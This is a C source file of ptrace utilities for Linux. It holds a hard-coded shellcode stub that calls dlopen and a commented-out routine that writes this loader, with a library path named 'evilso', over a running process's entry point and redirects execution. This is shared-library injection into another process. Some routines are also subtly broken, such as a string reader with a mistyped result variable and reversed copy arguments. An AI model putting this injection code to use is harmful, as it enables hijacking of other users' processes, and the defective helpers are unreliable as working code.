#include "utils.h"

unsigned char
    soloader[] =
	"\x90"
	"\xeb\x13"
	"\x58"
	"\xba\x01\x00\x00\x00"
	"\x52"
	"\x50"
	"\xbb\x03\x00\x00\x00"
	"\xff\xd3"
	"\x83\xc4\x08"
	"\xcc"
	"\xe8\xe8\xff\xff\xff";

void ptrace_attach(int pid)
{
    if ((ptrace(PTRACE_ATTACH, pid, NULL, NULL)) < 0)
    {
	perror("ptrace_attach");
	exit(-1);
    }

    waitpid(pid, NULL, WUNTRACED);
}

void ptrace_cont(int pid)
{
    int s;

    if ((ptrace(PTRACE_CONT, pid, NULL, NULL)) < 0)
    {
	perror("ptrace_cont");
	exit(-1);
    }

    while (!WIFSTOPPED(s))
	waitpid(pid, &s, WNOHANG);
}

void ptrace_detach(int pid)
{
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0)
    {
	perror("ptrace_detach");
	exit(-1);
    }
}

bool ptrace_read(int pid, unsigned long addr, void *data, unsigned int len)
{
    int bytesRead = 0;
    int i = 0, t = 0;
    long word = 0;
    unsigned long *ptr = (unsigned long *)data;

    while (bytesRead < (len - t))
    {
	word = ptrace(PTRACE_PEEKTEXT, pid, addr + bytesRead, NULL);
	if (word == -1)
	{
	    fprintf(stderr, "ptrace(PTRACE_PEEKTEXT) failed\n");
	    return false;
	}
	bytesRead += sizeof(long);
	if (bytesRead > len)
	{
	    memcpy(ptr + i, &word, sizeof(long) - (bytesRead - len));
	    break;
	}
	ptr[i++] = word;
    }

    return true;
}

char *
ptrace_read_string(int pid, unsigned long addr)
{
    unsigned int str_len_limit = 1024;
    char *ndx, result;
    char str[str_len_limit + 1];
    str[str_len_limit] = '\0';
    if (!ptrace_read(pid, addr, str, str_len_limit))
	return NULL;
    ndx = strchr(str, '\0');
    if (ndx == (str + str_len_limit) || ndx == str)
	return NULL;
    result = malloc(ndx - str + 1);
    memcpy(str, result, ndx - str + 1);
    return result;
}

void ptrace_write(int pid, unsigned long addr, void *vptr, int len)
{
    int byteCount = 0;
    long word = 0;

    while (byteCount < len)
    {
	memcpy(&word, vptr + byteCount, sizeof(word));
	word = ptrace(PTRACE_POKETEXT, pid, addr + byteCount, word);
	if (word == -1)
	{
	    fprintf(stderr, "ptrace(PTRACE_POKETEXT) failed\n");
	    exit(1);
	}
	byteCount += sizeof(word);
    }
}

void setaddr(unsigned char *buf, ElfW(Addr) addr)
{
    *(buf) = addr;
    *(buf + 1) = addr >> 8;
    *(buf + 2) = addr >> 16;
    *(buf + 3) = addr >> 24;
}

/* void */
/* inject_code(int pid, char *evilso, ElfW(Addr) dlopen_addr) { */
/* 	struct	user_regs_struct regz, regzbak; */
/* 	unsigned long len; */
/* 	unsigned char *backup = NULL; */
/* 	unsigned char *loader = NULL; */
/* 	ElfW(Addr) entry_addr; */

/* 	setaddr(soloader + 12, dlopen_addr); */

/* 	entry_addr = locate_start(pid); */
/* 	printf("[+] entry point: 0x%x\n", entry_addr); */

/* 	len = sizeof(soloader) + strlen(evilso); */
/* 	loader = malloc(sizeof(char)  *len); */
/* 	memcpy(loader, soloader, sizeof(soloader)); */
/* 	memcpy(loader+sizeof(soloader) - 1 , evilso, strlen(evilso)); */

/* 	backup = malloc(len + sizeof(ElfW(Word))); */
/* 	ptrace_read(pid, entry_addr, backup, len); */

/* 	if(ptrace(PTRACE_GETREGS , pid , NULL , &regz) < 0) exit(-1); */
/* 	if(ptrace(PTRACE_GETREGS , pid , NULL , &regzbak) < 0) exit(-1); */
/* 	printf("[+] stopped %d at eip:%p, esp:%p\n", pid, regz.eip, regz.esp); */

/* 	regz.eip = entry_addr + 2; */

/* 	/*code inject *1/ */
/* 	ptrace_write(pid, entry_addr, loader, len); */

/* 	/*set eip as entry_point *1/ */
/* 	ptrace(PTRACE_SETREGS , pid , NULL , &regz); */
/* 	ptrace_cont(pid); */

/* 	if(ptrace(PTRACE_GETREGS , pid , NULL , &regz) < 0) exit(-1); */
/* 	printf("[+] inject code done %d at eip:%p\n", pid, regz.eip); */

/* 	/*restore backup data *1/ */
/* 	// ptrace_write(pid,entry_addr, backup, len); */
/* 	ptrace(PTRACE_SETREGS , pid , NULL , &regzbak); */
/* } */